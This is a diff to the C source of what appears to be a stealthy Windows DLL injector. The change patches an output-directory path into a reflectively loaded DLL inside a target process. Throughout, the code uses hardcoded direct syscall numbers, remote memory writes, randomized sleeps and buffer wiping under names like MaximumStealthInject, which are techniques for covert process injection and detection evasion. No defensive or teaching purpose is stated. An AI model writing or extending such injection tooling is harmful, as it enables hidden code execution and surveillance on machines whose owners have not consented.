@@ -10,6 +10,10 @@
 typedef LONG NTSTATUS;
 #define STATUS_SUCCESS 0x00000000
 
+/* Must match helper_dll.c MAGIC_OUTPUT_DIR */
+#define MAGIC_OUTPUT_DIR 0x525449525450554fULL
+
+
 #define SYS_NtAllocateVirtualMemory 0x0018
 #define SYS_NtWriteVirtualMemory 0x003A
 #define SYS_NtProtectVirtualMemory 0x0050
@@ -712,6 +716,10 @@ static DWORD GetRandomDelay(DWORD min, DWORD max) {
     return min + (entropy % (max - min + 1));
 }
 
+/* Forward declarations for output directory helpers */
+static DWORD FindOutputDirRva(PVOID dllBuffer, SIZE_T dllSize);
+static void GetMyDir(char* out, SIZE_T outSize);
+
 static int EarlyInjectSuspended(PLAUNCHED_PROCESS pLaunchedProc, const char* dllPath) {
     HANDLE hProcess = pLaunchedProc->hProcess;
     
@@ -719,7 +727,23 @@ static int EarlyInjectSuspended(PLAUNCHED_PROCESS pLaunchedProc, const char* dll
     PVOID dllBuffer = ReadDLLFile(dllPath, &dllSize);
     if (!dllBuffer) return 2;
     
+    /* Scan for output directory marker BEFORE zeroing the buffer */
+    DWORD outputPathRva = FindOutputDirRva(dllBuffer, dllSize);
+    
     PVOID dllBase = ReflectiveLoadDLL(hProcess, dllBuffer, dllSize);
+    
+    /* If marker found, write the injector's directory into the remote DLL */
+    if (dllBase && outputPathRva) {
+        char myDir[MAX_PATH];
+        GetMyDir(myDir, sizeof(myDir));
+        if (myDir[0]) {
+            PVOID remotePath = (LPBYTE)dllBase + outputPathRva;
+            SIZE_T written = 0;
+            NtWriteVirtualMemory(hProcess, remotePath, myDir,
+                                 (SIZE_T)strlen(myDir) + 1, &written);
+        }
+    }
+    
     StealthZeroMemory(dllBuffer, dllSize);
     VirtualFree(dllBuffer, 0, MEM_RELEASE);
     
@@ -793,6 +817,68 @@ static int EarlyInjectSuspended(PLAUNCHED_PROCESS pLaunchedProc, const char* dll
     return 0;
 }
 
+/*
+ * Convert a file offset (raw byte position in the DLL file) to an RVA
+ * (relative virtual address) using the PE section headers.
+ * The .data section's file offset and virtual address often differ,
+ * so this conversion is critical for correct memory addressing.
+ */
+static DWORD FileOffsetToRva(PVOID dllBuffer, DWORD fileOffset) {
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)dllBuffer;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
+
+    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((LPBYTE)dllBuffer + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
+
+    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
+    WORD numSections = nt->FileHeader.NumberOfSections;
+
+    for (WORD i = 0; i < numSections; i++) {
+        DWORD secFileStart = sections[i].PointerToRawData;
+        DWORD secFileEnd   = secFileStart + sections[i].SizeOfRawData;
+
+        if (fileOffset >= secFileStart && fileOffset < secFileEnd) {
+            /* RVA = section's VA + (file offset - section's file offset) */
+            return sections[i].VirtualAddress + (fileOffset - secFileStart);
+        }
+    }
+    return 0; /* Not found in any loaded section */
+}
+
+/*
+ * Scan the DLL image buffer for MAGIC_OUTPUT_DIR marker.
+ * If found, returns the RVA of g_outputPath[] (right after the 8-byte
+ * marker), properly converted from file-offset to RVA. Returns 0 if
+ * the marker is not found or conversion fails.
+ */
+static DWORD FindOutputDirRva(PVOID dllBuffer, SIZE_T dllSize) {
+    LPBYTE p = (LPBYTE)dllBuffer;
+    for (SIZE_T i = 0; i < dllSize - sizeof(UINT64) - MAX_PATH; i += 1) {
+        if (*(UINT64*)(p + i) == MAGIC_OUTPUT_DIR) {
+            /* The marker was found at file offset i; g_outputPath is right after it */
+            DWORD fileOffset = (DWORD)(i + sizeof(UINT64));
+            return FileOffsetToRva(dllBuffer, fileOffset);
+        }
+    }
+    return 0;
+}
+
+/* Get the directory containing injector.exe (with trailing backslash) */
+static void GetMyDir(char* out, SIZE_T outSize) {
+    char mod[MAX_PATH];
+    GetModuleFileNameA(NULL, mod, sizeof(mod));
+    char* slash = strrchr(mod, '\\');
+    if (slash) {
+        SIZE_T len = (slash - mod) + 1;
+        if (len < outSize) {
+            memcpy(out, mod, len);
+            out[len] = 0;
+        }
+    } else {
+        out[0] = 0;
+    }
+}
+
 static int MaximumStealthInject(DWORD processId, const char* dllPath) {
     StealthSleep(GetRandomDelay(50, 100));
     
@@ -818,7 +904,33 @@ static int MaximumStealthInject(DWORD processId, const char* dllPath) {
         return 2;
     }
     
+    /* Scan the DLL buffer for the output-directory marker BEFORE zeroing */
+    DWORD outputPathRva = FindOutputDirRva(dllBuffer, dllSize);
+    if (outputPathRva) {
+        printf("[*] Found output directory marker at RVA 0x%X\n", outputPathRva);
+    } else {
+        printf("[*] Output directory marker not found (files will be in target CWD)\n");
+    }
+    
     PVOID dllBase = ReflectiveLoadDLL(hProcess, dllBuffer, dllSize);
+    
+    /* If marker was found, write the injector's directory into the remote DLL */
+    if (dllBase && outputPathRva) {
+        char myDir[MAX_PATH];
+        GetMyDir(myDir, sizeof(myDir));
+        if (myDir[0]) {
+            PVOID remotePath = (LPBYTE)dllBase + outputPathRva;
+            SIZE_T written = 0;
+            NTSTATUS ws = NtWriteVirtualMemory(hProcess, remotePath, myDir,
+                                                (SIZE_T)strlen(myDir) + 1, &written);
+            if (ws == STATUS_SUCCESS) {
+                printf("[*] Output directory set: %s\n", myDir);
+            } else {
+                printf("[-] Failed to write output directory to remote process\n");
+            }
+        }
+    }
+    
     StealthZeroMemory(dllBuffer, dllSize);
     VirtualFree(dllBuffer, 0, MEM_RELEASE);
     
